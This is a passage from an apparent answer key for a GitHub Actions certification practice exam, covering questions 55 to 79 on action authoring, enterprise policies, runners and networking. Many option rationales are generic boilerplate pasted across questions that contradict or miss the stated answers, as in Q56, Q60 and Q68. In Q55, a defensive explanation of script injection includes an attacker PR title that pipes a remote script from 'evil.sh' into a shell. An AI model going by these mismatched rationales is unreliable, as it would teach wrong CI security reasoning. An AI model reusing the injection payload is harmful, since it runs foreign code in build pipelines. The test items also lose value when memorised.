- **F:** Incorrect. Composite actions fail schema validation if any `run:` step omits `shell:`, unlike normal workflow jobs which provide a default OS shell.

### Question 55 — `A` (Author and maintain actions)

Correct answer: A (is correct). `core.summary` in `@actions/core` provides a fluent HTML/Markdown builder (`.addHeading()`, `.addTable()`, `.addCodeBlock()`, `.write()`) that writes cleanly to `$GITHUB_STEP_SUMMARY`. [Skill 3.5: Implement workflow commands, exit codes, and output handling within actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/setting-exit-codes-for-actions)]

- **A:** Correct. `@actions/core` safely escapes multiline environment file values, masks secrets via `setSecret()`, and passes state between `pre:` -> `main:` -> `post:` scripts via `saveState`/`getState`.
- **B:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **C:** Incorrect. Raw `${{ ... }}` expands before shell parsing so an attacker PR title like `"; curl evil.sh | sh #` executes arbitrary code; pass via `env:` (`TITLE: ${{ ... }}`) and quote `"$TITLE"`.
- **D:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.

### Question 56 — `C` (Author and maintain actions)

Correct answer: C (is correct). Using `@actions/exec` (`await exec.exec('bcftools', ['view', inputPath])`) spawns binaries directly with an argument array (`no shell interpolation, preventing command injection`) and rejects automatically on non-zero exit codes. [Skill 3.5: Implement workflow commands, exit codes, and output handling within actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/setting-exit-codes-for-actions)]

- **A:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Correct. `@actions/core` safely escapes multiline environment file values, masks secrets via `setSecret()`, and passes state between `pre:` -> `main:` -> `post:` scripts via `saveState`/`getState`.
- **D:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.

### Question 57 — `B` (Author and maintain actions)

Correct answer: B (is correct). Publish `vireobio/fastq-qc-action` in a standalone `Public` repository (`optionally listed on GitHub Marketplace`), and host `vireobio/clinical-caller-action` in an `Internal` (or `Private`) Enterprise repository with `Actions -> General -> Access -> Accessible from repositories in the enterprise`. [Skill 3.6: Select an appropriate distribution model for public, private, and enterprise actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/sharing-actions-and-workflows-from-your-private-repository)]

- **A:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **B:** Correct. Enterprise teams can share private/internal actions across organizations without publishing proprietary code to the public internet or GitHub Marketplace.
- **C:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **D:** Incorrect. Marketplace rejects repositories that are `Private`/`Internal`, lack a root `action.yml`, or bundle multiple actions inside one repository.

### Question 58 — `C` (Author and maintain actions)

Correct answer: C (is correct). Yes — when an external private action lives outside your Organization/Enterprise (`so native Access sharing cannot cross tenants`), checking it out into a workspace subpath with a scoped token and invoking it as a local path action (`uses: ./.ext/prop`) works cleanly. [Skill 3.6: Select an appropriate distribution model for public, private, and enterprise actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/sharing-actions-and-workflows-from-your-private-repository)]

- **A:** Incorrect. Marketplace rejects repositories that are `Private`/`Internal`, lack a root `action.yml`, or bundle multiple actions inside one repository.
- **B:** Incorrect. Each job boots a fresh runner environment, so `$GITHUB_ENV` is destroyed when the job ends; cross-job strings must be exposed via `jobs.<id>.outputs`.
- **C:** Correct. Every trigger, context, permission, runner, and security boundary in the proposed solution aligns with official GitHub Actions behavior.
- **D:** Incorrect. Jobs running on `macos-latest` or `windows-latest` fail if a step invokes a `runs.using: "docker"` action; use `node20` JavaScript or `composite` actions for multi-OS support.

### Question 59 — `C` (Author and maintain actions)

Correct answer: C (is correct). Enterprise Managed User (`EMU`) accounts can contribute ONLY inside their own Enterprise (`Private` and `Internal` repositories) and cannot create `Public` repositories or publish public GitHub Marketplace listings (`which require a standard non-EMU GitHub.com organization/account`). [Skill 3.7: Publish actions to GitHub Marketplace | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/publishing-actions-in-github-marketplace)]

- **A:** Incorrect. Marketplace rejects repositories that are `Private`/`Internal`, lack a root `action.yml`, or bundle multiple actions inside one repository.
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Correct. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **D:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.

### Question 60 — `D` (Author and maintain actions)

Correct answer: D (is correct). No — publishing an action to GitHub Marketplace strictly requires `2FA` enabled on the publisher account, acceptance of the GitHub Marketplace Developer Agreement, root `action.yml`, and a valid Semantic Versioning (`vX.Y.Z` / `X.Y.Z`) release tag (`not mutable latest`). [Skill 3.7: Publish actions to GitHub Marketplace | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/publishing-actions-in-github-marketplace)]

- **A:** Incorrect. The proposed workflow or action configuration violates at least one stated GitHub Actions execution, security, or governance rule. No — publishing an action to GitHub Marketplace strictly requires `2FA` enabled on the publisher account, acceptance of the GitHub Marketplace Developer Agreement, root `action.yml`, and a valid Semantic Versioning (`vX.Y.Z` / `X.Y.Z`) release tag (`not mutable latest`).
- **B:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **C:** Incorrect. Maintaining SemVer tags (`v1.2.0`), sliding major tags (`v1`), and full 40-character SHA references (`Dependabot updates both SHA and comment`) balances ergonomics and supply-chain safety.
- **D:** Correct. Marketplace rejects repositories that are `Private`/`Internal`, lack a root `action.yml`, or bundle multiple actions inside one repository.

### Question 61 — `D` (Author and maintain actions)

Correct answer: D (is correct). After pushing immutable tag `v1.2.2`, run `git tag -fa v1 -m "Update v1 to v1.2.2" && git push origin v1 --force` (`while v1.2.2 itself remains immutable in GHCR Immutable Actions`). [Skill 3.8: Create and manage action releases, tags, and versioning strategies for consumers | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/releasing-and-maintaining-actions)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **C:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **D:** Correct. Maintaining SemVer tags (`v1.2.0`), sliding major tags (`v1`), and full 40-character SHA references (`Dependabot updates both SHA and comment`) balances ergonomics and supply-chain safety.

### Question 62 — `D, F` (Author and maintain actions)

Correct answers: D and F (are correct). Dependabot scans `.github/workflows/*.yml` (`and composite action uses: references`) to open weekly PRs bumping version tags or 40-character commit SHAs, and preserves trailing `# vX.Y.Z` human-readable version comments when updating SHA pins. [Skill 3.8: Create and manage action releases, tags, and versioning strategies for consumers | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/releasing-and-maintaining-actions)]

- **A:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **B:** Incorrect. Marketplace rejects repositories that are `Private`/`Internal`, lack a root `action.yml`, or bundle multiple actions inside one repository.
- **C:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **D:** Correct. Maintaining SemVer tags (`v1.2.0`), sliding major tags (`v1`), and full 40-character SHA references (`Dependabot updates both SHA and comment`) balances ergonomics and supply-chain safety.
- **E:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **F:** Correct. Combining immutable SemVer releases, major `v1` convenience tags, and 40-char SHA pinning follows GitHub official action release guidance.

### Question 63 — `D` (Manage GitHub Actions for the enterprise)

Correct answer: D (is correct). An Enterprise Repository Ruleset (`Enterprise -> Policies -> Rulesets`) with `Require workflows to pass before merging` enforces a central `Internal`-repository workflow across matching repositories in all selected organizations in the Enterprise. [Skill 4.1: Configure and govern enterprise-level reuse of actions and reusable workflows | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/sharing-automations/reusing-workflows)]

- **A:** Incorrect. Starter templates only scaffold initial file creation; centrally updating CI logic across 100 repos requires a Reusable Workflow (`on: workflow_call`) or Required Workflow.
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **D:** Correct. Reusable workflows let teams opt into shared jobs, whereas Repository Ruleset Required Workflows enforce un-editable governance checks automatically across matching repos.

### Question 64 — `B` (Manage GitHub Actions for the enterprise)

Correct answer: B (is correct). Cross-organization required workflows must be readable by target repositories across organizations in the Enterprise (`making a dedicated, Ruleset-protected Internal repository in a platform org the enterprise gold standard`). [Skill 4.1: Configure and govern enterprise-level reuse of actions and reusable workflows | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/sharing-automations/reusing-workflows)]

- **A:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **B:** Correct. Reusable workflows let teams opt into shared jobs, whereas Repository Ruleset Required Workflows enforce un-editable governance checks automatically across matching repos.
- **C:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **D:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.

### Question 65 — `B` (Manage GitHub Actions for the enterprise)

Correct answer: B (is correct). If a required workflow is skipped due to `paths` / `paths-ignore` / `branches-ignore` filters on `pull_request`, its required status check remains `Expected — Waiting for status to be reported` and BLOCKS merging; required workflows must run (`using internal job if: conditions instead of top-level path filters`). [Skill 4.1: Configure and govern enterprise-level reuse of actions and reusable workflows | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/sharing-automations/reusing-workflows)]

- **A:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **B:** Correct. Reusable workflows let teams opt into shared jobs, whereas Repository Ruleset Required Workflows enforce un-editable governance checks automatically across matching repos.
- **C:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **D:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.

### Question 66 — `B` (Manage GitHub Actions for the enterprise)

Correct answer: B (is correct). Select `Settings -> Actions -> General -> Access -> Accessible from repositories in the 'vireobio' enterprise` (`as the narrower 'organization' option allows only repos inside vireobio-platform`). [Skill 4.2: Control access and sharing policies for actions and workflows across repositories and organizations | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/sharing-automations/creating-actions/sharing-actions-and-workflows-with-your-enterprise)]

- **A:** Incorrect. Marketplace rejects repositories that are `Private`/`Internal`, lack a root `action.yml`, or bundle multiple actions inside one repository.
- **B:** Correct. Even on an `Internal` repository, sibling organizations cannot invoke its `workflow_call` or actions until `Actions -> General -> Access` explicitly enables enterprise/org sharing.
- **C:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **D:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.

### Question 67 — `A, B` (Manage GitHub Actions for the enterprise)

Correct answers: A and B (are correct). Enabling `Accessible from repositories in the enterprise` lets `Private` and `Internal` workflows invoke the shared repository's YAML/actions via `GITHUB_TOKEN` WITHOUT exposing the shared repo's own Actions secrets, AND `Public` repositories are still strictly blocked from calling `Private`/`Internal` actions. [Skill 4.2: Control access and sharing policies for actions and workflows across repositories and organizations | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/sharing-automations/creating-actions/sharing-actions-and-workflows-with-your-enterprise)]

- **A:** Correct. Enterprise reuse combines `Internal`/`Private` repo `Access` sharing with allowlist + 40-character SHA pinning policies.
- **B:** Correct. Even on an `Internal` repository, sibling organizations cannot invoke its `workflow_call` or actions until `Actions -> General -> Access` explicitly enables enterprise/org sharing.
- **C:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.
- **D:** Incorrect. Marketplace rejects repositories that are `Private`/`Internal`, lack a root `action.yml`, or bundle multiple actions inside one repository.
- **E:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **F:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.

### Question 68 — `A` (Manage GitHub Actions for the enterprise)

Correct answer: A (is correct). Setting `Workflow permissions -> Read repository contents and packages permissions` at the Enterprise (`or Organization`) policy level locks repository-level overrides so repo admins cannot widen the default `GITHUB_TOKEN` ceiling (`workflows must declare explicit least-privilege permissions: blocks in YAML`). [Skill 4.2: Control access and sharing policies for actions and workflows across repositories and organizations | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/sharing-automations/creating-actions/sharing-actions-and-workflows-with-your-enterprise)]

- **A:** Correct. Even on an `Internal` repository, sibling organizations cannot invoke its `workflow_call` or actions until `Actions -> General -> Access` explicitly enables enterprise/org sharing.
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **D:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.

### Question 69 — `C` (Manage GitHub Actions for the enterprise)

Correct answer: C (is correct). Neither runs — the wildcard pattern `hashicorp/vault-action@v3.*` permits ONLY refs matching `v3.*` (`blocking @v2.7.0 and @main`); however, turning ON `Require actions to be pinned to a full-length commit SHA` supersedes tag globs and mandates 40-char commit SHAs. [Skill 4.3: Enforce enterprise and organization policies for allowed actions and workflow execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/admin/enforcing-policies/enforcing-policies-for-your-enterprise/enforcing-policies-for-github-actions-in-your-enterprise)]

- **A:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Correct. Enterprise/Org Actions policies block unvetted Marketplace code, reject mutable `@v1`/`@main` tags when full-SHA pinning is required, and gate external fork PR runs.
- **D:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.

### Question 70 — `A` (Manage GitHub Actions for the enterprise)

Correct answer: A (is correct). No — maintainer approval on an outside contributor's fork PR grants a single execution for the approved commit SHA (`111aaa`); pushing a new commit (`222bbb`) pauses workflows in `Waiting` again until a maintainer inspects and approves the new diff. [Skill 4.3: Enforce enterprise and organization policies for allowed actions and workflow execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/admin/enforcing-policies/enforcing-policies-for-your-enterprise/enforcing-policies-for-github-actions-in-your-enterprise)]

- **A:** Correct. Enterprise/Org Actions policies block unvetted Marketplace code, reject mutable `@v1`/`@main` tags when full-SHA pinning is required, and gate external fork PR runs.
- **B:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **C:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **D:** Incorrect. Never checkout and build untrusted fork `pull_request.head.sha` inside `pull_request_target`; run untrusted tests in unprivileged `on: pull_request` instead.

### Question 71 — `B, C, F` (Manage GitHub Actions for the enterprise)

Correct answers: B, C, and F (are correct). Enforce `Require actions to be pinned to a full-length commit SHA` at the Enterprise policy level, disable `Allow GitHub Actions to create and approve pull requests`, and configure Deployment Environment `Required reviewers` with `Prevent self-review` enabled. [Skill 4.3: Enforce enterprise and organization policies for allowed actions and workflow execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/admin/enforcing-policies/enforcing-policies-for-your-enterprise/enforcing-policies-for-github-actions-in-your-enterprise)]

- **A:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **B:** Correct. Enterprise/Org Actions policies block unvetted Marketplace code, reject mutable `@v1`/`@main` tags when full-SHA pinning is required, and gate external fork PR runs.
- **C:** Correct. Deployment Environments hold production secrets/OIDC until human and webhook gates pass, and `Verified creator` badges indicate partner identity (`still audit source & pin 40-char SHA!`).
- **D:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **E:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **F:** Correct. Even on an `Internal` repository, sibling organizations cannot invoke its `workflow_call` or actions until `Actions -> General -> Access` explicitly enables enterprise/org sharing.

### Question 72 — `C` (Manage GitHub Actions for the enterprise)

Correct answer: C (is correct). With GA `gha-runner-scale-set`, workflows target the exact Helm installation / `runnerScaleSetName` string directly (`runs-on: bio-arm64-runners`), which ARC's listener autoscales from `minRunners` (`0`) up to `maxRunners` on demand. [Skill 4.4: Plan, deploy, and scale GitHub-hosted and self-hosted runners (including ephemeral and Kubernetes-based runners) | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/using-github-hosted-runners/using-larger-runners/about-larger-runners)]

- **A:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **B:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **C:** Correct. Ephemeral single-job runners (`hosted`, `--ephemeral`, `JIT`, or `ARC` scale-set pods authenticated via GitHub App) eliminate cross-job workspace contamination.
- **D:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.

### Question 73 — `B` (Manage GitHub Actions for the enterprise)

Correct answer: B (is correct). GitHub-hosted GPU Larger runners (`Linux GPU-accelerated Larger runners on GitHub Team / Enterprise Cloud`) provide preinstalled NVIDIA drivers + CUDA toolkits, autoscaling, and Runner Group isolation without self-hosting GPU servers. [Skill 4.4: Plan, deploy, and scale GitHub-hosted and self-hosted runners (including ephemeral and Kubernetes-based runners) | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/using-github-hosted-runners/using-larger-runners/about-larger-runners)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Correct. Ephemeral single-job runners (`hosted`, `--ephemeral`, `JIT`, or `ARC` scale-set pods authenticated via GitHub App) eliminate cross-job workspace contamination.
- **C:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **D:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!

### Question 74 — `A` (Manage GitHub Actions for the enterprise)

Correct answer: A (is correct). Creating an org GitHub App + K8s Secret, creating a restricted Runner Group (`no Public repos`), deploying `gha-runner-scale-set-controller` + `gha-runner-scale-set` (`minRunners: 0`), and allowing egress to `github.com`, `*.actions.githubusercontent.com`, and `ghcr.io` completes deployment. [Skill 4.4: Plan, deploy, and scale GitHub-hosted and self-hosted runners (including ephemeral and Kubernetes-based runners) | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/using-github-hosted-runners/using-larger-runners/about-larger-runners)]

- **A:** Correct. GA ARC pairs `gha-runner-scale-set` + GitHub App auth inside a restricted Runner Group with Immutable Actions (`ghcr.io`) egress.
- **B:** Incorrect. Cloning `.runner` identity files triggers session conflicts; ARC mints fresh JIT runner configs per pod.
- **C:** Incorrect. Personal PATs share a 5,000/hr cap, public repos expose internal clusters to fork PR attacks, and blocking `ghcr.io` breaks Immutable Actions.
- **D:** Incorrect. Legacy webhook ARC is deprecated; GA `gha-runner-scale-set` uses outbound long-polling and ephemeral single-job pods.

### Question 75 — `B` (Manage GitHub Actions for the enterprise)

Correct answer: B (is correct). Immutable Actions are served as OCI packages from `pkg.actions.githubusercontent.com` and GitHub Container Registry (`ghcr.io` / `*.pkg.containers.githubusercontent.com`), so runner egress firewalls must permit HTTPS `443` to `ghcr.io` as well as `*.actions.githubusercontent.com`. [Skill 4.5: Configure runner networking, IP allow lists, proxies, and private networking (including Azure VNet integration) | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/admin/configuring-settings/configuring-private-networking-for-hosted-compute-products/about-azure-private-networking-for-github-hosted-runners-in-your-enterprise)]

- **A:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **B:** Correct. Azure Private Networking injects Linux/Windows Larger runners into private subnets (`not arm64 macOS`), and firewall allowlists must permit `*.actions.githubusercontent.com` + `ghcr.io` for Immutable Actions.
- **C:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.
- **D:** Incorrect. Immutable Actions distribute OCI action packages from `ghcr.io` / `pkg.actions.githubusercontent.com`; blocking those hosts breaks action downloads during job setup!

### Question 76 — `B, C` (Manage GitHub Actions for the enterprise)

Correct answers: B and C (are correct). Azure VNet integration (`GitHub.Network/networkSettings` subnet delegation) works for Linux and Windows Larger runners (`NOT macOS`), and outbound runner traffic routes through the customer's Azure VNet NAT Gateway / Firewall (`whose public NAT IP can be added directly to the GitHub IP allow list`). [Skill 4.5: Configure runner networking, IP allow lists, proxies, and private networking (including Azure VNet integration) | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/admin/configuring-settings/configuring-private-networking-for-hosted-compute-products/about-azure-private-networking-for-github-hosted-runners-in-your-enterprise)]

- **A:** Incorrect. Immutable Actions distribute OCI action packages from `ghcr.io` / `pkg.actions.githubusercontent.com`; blocking those hosts breaks action downloads during job setup!
- **B:** Correct. Azure Private Networking injects Linux/Windows Larger runners into private subnets (`not arm64 macOS`), and firewall allowlists must permit `*.actions.githubusercontent.com` + `ghcr.io` for Immutable Actions.
- **C:** Correct. Linux/Windows Larger runners join Azure VNets via `NetworkSettings`, and egress allowlists must include `pkg.actions.githubusercontent.com` + `ghcr.io` for Immutable Actions.
- **D:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.
- **E:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **F:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.

### Question 77 — `D` (Manage GitHub Actions for the enterprise)

Correct answer: D (is correct). Setting `no_proxy` (`and NO_PROXY`) in the self-hosted runner's `.env` file bypasses the HTTP/HTTPS forward proxy for internal private domains and RFC1918 subnets while still proxying outbound `github.com` / `ghcr.io` traffic. [Skill 4.5: Configure runner networking, IP allow lists, proxies, and private networking (including Azure VNet integration) | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/admin/configuring-settings/configuring-private-networking-for-hosted-compute-products/about-azure-private-networking-for-github-hosted-runners-in-your-enterprise)]

- **A:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **D:** Correct. Azure Private Networking injects Linux/Windows Larger runners into private subnets (`not arm64 macOS`), and firewall allowlists must permit `*.actions.githubusercontent.com` + `ghcr.io` for Immutable Actions.

### Question 78 — `C` (Manage GitHub Actions for the enterprise)

Correct answer: C (is correct). No — each self-hosted runner (`or Larger runner / ARC scale set`) belongs to EXACTLY ONE Runner Group at a time (`moving a runner into hipaa-prod-runners automatically removes it from default`). [Skill 4.6: Organize runner groups, restrict access, and monitor or troubleshoot runner health and performance | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups)]

- **A:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Correct. Runner Groups enforce multi-tenant blast-radius boundaries down to approved workflow YAML paths, while `_diag/Runner_*.log` (listener) and `Worker_*.log` (job) speed triage.
- **D:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.

### Question 79 — `C, F` (Manage GitHub Actions for the enterprise)

Correct answers: C and F (are correct). Even developers with write/branch-push access inside allowed clinical repositories CANNOT schedule arbitrary feature-branch workflow YAML onto `hipaa-prod-runners`, and only runs executing that exact approved reusable/required workflow ref (`@refs/tags/v2.0.0`) are dispatched to the group. [Skill 4.6: Organize runner groups, restrict access, and monitor or troubleshoot runner health and performance | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **C:** Correct. Scoped Runner Groups + ephemeral single-job runners protect enterprise compute and internal networks.
